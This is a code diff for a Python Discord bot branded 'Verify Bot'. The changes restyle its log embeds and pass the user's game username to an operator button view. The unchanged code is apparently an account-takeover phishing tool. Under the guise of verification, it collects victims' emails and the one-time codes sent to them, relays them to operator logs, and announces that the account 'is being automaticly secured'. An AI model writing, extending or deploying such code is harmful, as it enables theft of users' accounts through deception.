@@ -41,22 +41,20 @@ class MyModalTwo(ui.Modal):
                 await send_logs(
                     interaction.client,
                     Embed(
-                        title = f"User | {interaction.user.name} ({interaction.user.id})",
                         description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                         timestamp = datetime.datetime.now(),
                         colour = 0xFF5C5C
-                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
-                    view = ButtonOptions(interaction.user, interaction.user.id),
+                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
+                    view = ButtonOptions(interaction.user, interaction.user.id, self.username),
                     email = self.email
                 )
                 return
 
         embed = discord.Embed(
-            title = f"User | {interaction.user.name}",
             description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
-        )
+        ).set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}")
         
         if self.username and self.username.strip():
             thumbnail_url = f"https://visage.surgeplay.com/full/512/{self.username}"
@@ -65,7 +63,7 @@ class MyModalTwo(ui.Modal):
         await interaction.response.defer(ephemeral=True)
 
         await send_logs(interaction.client, content="**This Account is being automaticly secured**")
-        await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id), email=self.email)
+        await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id, self.username), email=self.email)
 
         await interaction.followup.send(
             embed = discord.Embed(
@@ -84,11 +82,10 @@ class MyModalTwo(ui.Modal):
         if not securedAccount:
 
             embed = discord.Embed(
-                title = f"User | {interaction.user.name} ({interaction.user.id})",
                 description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
                 timestamp = datetime.datetime.now(),
                 colour = 0xFF5C5C                  
-            )
+            ).set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}")
             
             if self.username and self.username.strip():
                 embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
@@ -96,7 +93,7 @@ class MyModalTwo(ui.Modal):
             await send_logs(
                 interaction.client,
                 embed,
-                view=ButtonOptions(interaction.user, interaction.user.id),
+                view = ButtonOptions(interaction.user, interaction.user.id, self.username),
                 email=self.email
             )
 
